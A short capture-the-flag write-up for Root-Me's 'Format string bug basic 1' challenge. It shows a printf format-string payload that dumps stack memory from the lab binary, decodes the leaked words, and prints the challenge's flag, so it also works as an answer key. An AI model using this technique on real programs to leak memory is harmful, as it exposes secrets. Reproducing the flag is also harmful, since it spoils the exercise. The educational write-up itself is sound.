# ELF x86 - Format string bug basic 1
https://www.root-me.org/en/Challenges/App-System/ELF-x86-Format-string-bug-basic-1
```
Environment configuration :
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 No 
NX 	Non-Executable Stack 	                 No 
ASLR 	Address Space Layout Randomization 	 No 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 Yes 

Challenge connection informations :

Host	        challenge02.root-me.org
Protocol	SSH
Port	        2222
SSH access 	ssh -p 2222 app-systeme-ch5@challenge02.root-me.org  
Username	app-systeme-ch5
Password	app-systeme-ch5
```

According to the provided source code, the program reads the **.passwd** file and prints a messsage given by the user (argv[1]).<br>
The _printf_ function prints an uncontrolled string, and therefore the program is vulnerable for format string attacks.<br>
Because the program reads the file into a local buffer, the flag should be in the stack. Therefore, there is no need for a shell, just printing the stack values using the vulnerable _printf_ function.<br><br>

First, let's verifiy that the program actually prints the stack values:
```sh
app-systeme-ch5@challenge02:~$ ./ch5 `python -c "print '%08x,'*14"`
00000020,0804b008,b7e562f3,00000000,08049ff4,00000002,bffffc14,bffffd32,0000002f,0804b008,39617044,28293664,6d617045,00000a64,
```

The end of the output looks suspicious. If we'll convert the last 4 words we should get "9apD()6dmapEd".<br>
And if we'll convert it to big-endian format (as it should be - the memory saves the bytes in little endian) then we should get the flag "Dpa9d6)(Epamd".
